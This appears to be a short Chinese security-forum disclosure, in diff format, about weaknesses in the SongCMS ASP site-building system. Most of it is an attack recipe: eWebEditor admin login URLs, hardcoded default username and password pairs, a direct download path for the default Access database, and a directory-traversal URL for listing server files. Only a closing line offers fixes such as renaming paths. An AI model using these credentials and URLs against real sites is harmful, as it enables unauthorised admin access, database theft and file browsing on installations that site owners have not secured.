@@ -1,0 +1,25 @@
+程序简介：
+SongCMS企业建站系统是基于ASP+ACCESS/SQL技术的网站后台管理系统，
+适用于一般程序员开发各种个性化企业网站用,数据库及调用函数均有详细注释; 
+
+ewebeditor:
+http://www.shitsec.com/inc/ewebeditor/admin_login.asp
+http://www.shitsec.com/inc/ewebeditor/Admin_ModiPwd.asp
+yuzaosong
+9901361268
+
+不存在则：
+eweb 5.5
+http://www.shitsec.com/inc/ewebeditor/admin/login.asp
+admin
+admin
+
+默认数据库：
+http://www.shitsec.com/data/%23Song%20Access.asa
+找不到下面的方法可以遍历：
+（eweb 5.5为例其他的差不多）
+http://www.shitsec.com//inc/ewebeditor/admin/upload.asp?id=6&d_viewmode=list&dir=../
+google test:百度搜索登录入口 | Google搜索登录 百度收录页面 | Google收录页面 Alexa全球排名 | W3C验证服务 
+
+PS：此后台是在测试某大学分学院的时候发现的，发出来大家研究下，用此后台的站长请注意修复。
+简单修复：更改后台路径，修改数据库名及路径，修改在线编辑器路径等。
